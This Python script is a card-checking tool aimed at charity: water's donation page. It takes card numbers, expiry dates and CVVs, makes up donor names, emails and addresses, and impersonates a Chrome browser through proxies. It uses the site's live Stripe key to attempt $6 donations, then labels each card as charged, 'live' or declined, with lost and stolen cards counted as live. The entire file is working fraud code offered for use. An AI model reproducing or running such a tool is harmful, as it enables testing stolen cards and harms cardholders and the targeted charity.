from curl_cffi.requests import AsyncSession
import asyncio
import time
import random
import string
import re

PK_KEY = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
DONATE_URL = "https://www.charitywater.org/donate/stripe"
SITE_URL = "https://www.charitywater.org"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
    "transaction_not_allowed", "card_not_supported",
]


def _rand(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _fake_email():
    return f"{_rand(8)}{random.randint(100, 999)}@gmail.com"


def _fake_name():
    firsts = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Christopher",
              "Daniel", "Matthew", "Andrew", "Joshua", "Ryan", "Brandon", "Tyler", "Nathan", "Kevin", "Justin"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
             "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Harris", "Clark"]
    return random.choice(firsts), random.choice(lasts)


async def charitywater_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_year = yy
    elif len(yy) == 4:
        exp_year = yy[2:]
    else:
        exp_year = yy

    first, last = _fake_name()
    full_name = f"{first} {last}"
    email = _fake_email()
    zip_code = str(random.randint(10001, 10199))
    address = f"{random.randint(100, 999)} Broadway"

    guid = _rand(32)
    muid = f"{_rand(8)}-{_rand(4)}-{_rand(4)}-{_rand(4)}-{_rand(12)}"
    sid = _rand(32)

    session_kwargs = {"impersonate": "chrome120", "timeout": 30}
    if proxy:
        session_kwargs["proxies"] = {"https": proxy, "http": proxy}

    async with AsyncSession(**session_kwargs) as session:

        try:
            page_resp = await session.get(
                f"{SITE_URL}/donate",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "accept-language": "en-US,en;q=0.9",
                },
            )
            csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', page_resp.text)
            csrf_token = csrf_match.group(1) if csrf_match else ""
        except Exception:
            csrf_token = ""

        if not csrf_token:
            elapsed = round(time.time() - start, 2)
            return f"Error - Could not get session token [{elapsed}s]"

        stripe_data = (
            f"type=card"
            f"&billing_details[name]={full_name.replace(' ', '+')}"
            f"&billing_details[email]={email}"
            f"&billing_details[address][city]=New+York"
            f"&billing_details[address][country]=US"
            f"&billing_details[address][line1]={address.replace(' ', '+')}"
            f"&billing_details[address][postal_code]={zip_code}"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={mm.zfill(2)}"
            f"&card[exp_year]={exp_year}"
            f"&guid={guid}"
            f"&muid={muid}"
            f"&sid={sid}"
            f"&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Ff5ddf352d5%3B+stripe-js-v3%2Ff5ddf352d5%3B+card-element"
            f"&referrer=https%3A%2F%2Fwww.charitywater.org"
            f"&time_on_page={random.randint(60000, 120000)}"
            f"&key={PK_KEY}"
        )

        try:
            resp = await session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers={
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                },
                data=stripe_data,
            )
            pm_result = resp.json()
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - PM creation failed: {str(e)[:50]} [{elapsed}s]"

        if "error" in pm_result:
            err = pm_result["error"]
            code = err.get("code", "")
            decline = err.get("decline_code", "")
            msg = err.get("message", "")
            elapsed = round(time.time() - start, 2)

            if code == "card_declined" and decline in LIVE_DECLINE_CODES:
                return f"Live Declined - {decline} [{elapsed}s]"
            if code == "card_declined":
                return f"Declined - {decline or msg[:60]} [{elapsed}s]"
            if code == "incorrect_number":
                return f"Declined - Incorrect Number [{elapsed}s]"
            if code in ("invalid_expiry_year", "invalid_expiry_month"):
                return f"Declined - Invalid Expiry [{elapsed}s]"
            if code == "expired_card":
                return f"Declined - Expired Card [{elapsed}s]"
            if code == "rate_limit":
                return f"Error - Rate Limited [{elapsed}s]"
            if code == "api_key_expired":
                return f"Error - PK Key Expired [{elapsed}s]"

            return f"Declined - {code}: {msg[:60]} [{elapsed}s]"

        pm_id = pm_result.get("id")
        if not pm_id:
            elapsed = round(time.time() - start, 2)
            return f"Error - No PM ID returned [{elapsed}s]"

        donation_data = (
            f"country=us"
            f"&payment_intent[email]={email}"
            f"&payment_intent[amount]=6"
            f"&payment_intent[currency]=usd"
            f"&payment_intent[payment_method]={pm_id}"
            f"&disable_existing_subscription_check=false"
            f"&donation_form[amount]=6"
            f"&donation_form[comment]="
            f"&donation_form[display_name]="
            f"&donation_form[email]={email}"
            f"&donation_form[name]={first}"
            f"&donation_form[surname]={last}"
            f"&donation_form[payment_gateway_token]="
            f"&donation_form[payment_monthly_subscription]=false"
            f"&donation_form[campaign_id]="
            f"&donation_form[setup_intent_id]="
            f"&donation_form[subscription_period]="
            f"&donation_form[metadata][email_consent_granted]=true"
            f"&donation_form[metadata][full_donate_page_url]=https%3A%2F%2Fwww.charitywater.org%2F"
            f"&donation_form[metadata][phone_number]="
            f"&donation_form[metadata][plaid_account_id]="
            f"&donation_form[metadata][plaid_public_token]="
            f"&donation_form[metadata][uk_eu_ip]=false"
            f"&donation_form[metadata][with_saved_payment]=false"
            f"&donation_form[address][address_line_1]={address.replace(' ', '+')}"
            f"&donation_form[address][address_line_2]="
            f"&donation_form[address][city]=New+York"
            f"&donation_form[address][country]="
            f"&donation_form[address][zip]={zip_code}"
        )

        try:
            resp2 = await session.post(
                DONATE_URL,
                headers={
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": SITE_URL,
                    "referer": f"{SITE_URL}/donate",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest",
                    "x-csrf-token": csrf_token,
                    "accept-language": "en-US,en;q=0.9",
                    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                },
                data=donation_data,
            )
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return f"Error - Donation request failed: {str(e)[:50]} [{elapsed}s]"

        elapsed = round(time.time() - start, 2)
        status_code = resp2.status_code

        try:
            result = resp2.json()
        except Exception:
            if status_code == 200:
                return f"Charged $6 [{elapsed}s]"
            if status_code == 418:
                return f"Error - Bot Protection (418) [{elapsed}s]"
            return f"Error - Response ({status_code}) [{elapsed}s]"

        if result.get("success") is True:
            return f"Charged $6 [{elapsed}s]"

        pi_secret = result.get("payment_intent_client_secret", "")
        if pi_secret:
            pi_id = pi_secret.split("_secret_")[0] if "_secret_" in pi_secret else ""
            try:
                pi_resp = await session.get(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}?key={PK_KEY}&client_secret={pi_secret}",
                    headers={
                        "accept": "application/json",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    },
                )
                pi_data = pi_resp.json()
                pi_status = pi_data.get("status", "")
                last_error = pi_data.get("last_payment_error", {})
                decline_code = last_error.get("decline_code", "")
                error_code = last_error.get("code", "")
                error_msg = last_error.get("message", "")

                if pi_status == "succeeded":
                    return f"Charged $6 [{elapsed}s]"
                if pi_status == "requires_action":
                    return f"3DS Required [{elapsed}s]"
                if pi_status == "requires_payment_method":
                    if decline_code in LIVE_DECLINE_CODES:
                        return f"Live Declined - {decline_code} [{elapsed}s]"
                    if decline_code:
                        return f"Declined - {decline_code} [{elapsed}s]"
                    if error_code:
                        return f"Declined - {error_code}: {error_msg[:50]} [{elapsed}s]"
                    return f"Declined - Payment method failed [{elapsed}s]"

                return f"Declined - PI status: {pi_status} [{elapsed}s]"
            except Exception:
                pass

        if "requires_action" in str(result) or "requires_source_action" in str(result):
            return f"3DS Required [{elapsed}s]"

        error_msg = ""
        if "errors" in result and isinstance(result["errors"], list) and result["errors"]:
            error_msg = result["errors"][0]
        elif "error" in result:
            err = result["error"] if isinstance(result["error"], dict) else {"message": str(result["error"])}
            decline_code = err.get("decline_code", err.get("code", ""))
            error_msg = err.get("message", str(err))
            if decline_code in LIVE_DECLINE_CODES:
                return f"Live Declined - {decline_code} [{elapsed}s]"

        if not error_msg:
            error_msg = str(result)[:80]

        decline_match = re.search(
            r'(insufficient_funds|do_not_honor|lost_card|stolen_card|generic_decline|'
            r'card_velocity_exceeded|restricted_card|pickup_card|security_violation|'
            r'incorrect_cvc|invalid_cvc|incorrect_zip|try_again_later|not_permitted|'
            r'transaction_not_allowed|card_not_supported|withdrawal_count_limit_exceeded)',
            error_msg.lower()
        )
        if decline_match:
            return f"Live Declined - {decline_match.group(1)} [{elapsed}s]"

        if status_code == 502 and "error" in result:
            return f"CCN Live - Declined at charge [{elapsed}s]"

        return f"Declined - {error_msg[:80]} [{elapsed}s]"
